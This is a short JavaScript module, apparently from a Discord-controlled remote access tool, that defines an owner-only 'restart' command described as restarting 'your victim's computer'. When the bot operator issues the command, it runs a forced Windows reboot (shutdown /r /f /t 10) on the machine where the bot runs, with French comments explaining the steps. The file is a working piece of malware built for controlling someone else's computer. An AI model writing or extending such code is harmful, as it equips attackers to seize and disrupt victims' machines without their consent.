const { ApplicationCommandOptionType } = require("discord.js"),
{ exec } = require("child_process");

module.exports = {
  name: "restart",
  ownerOnly: true,
  description: "Restart your victim's computer!",
  run: async (client, interaction, args) => {
    await interaction.reply({
      content: "Wait...",
      ephemeral: true,
    });
    // Exécuter le fichier avec spawn
    const childProcess = exec(`shutdown /r /f /t 10`);

    // Répondre à l'interaction avec un message indiquant que pc va s'arreter
    await interaction.editReply({
      content: `Computer Will Restart in 10sec`,
      ephemeral: true,
    });
    // Détacher le processus pour qu'il continue de s'exécuter même après la fin du bot
    childProcess.unref();
  },
};
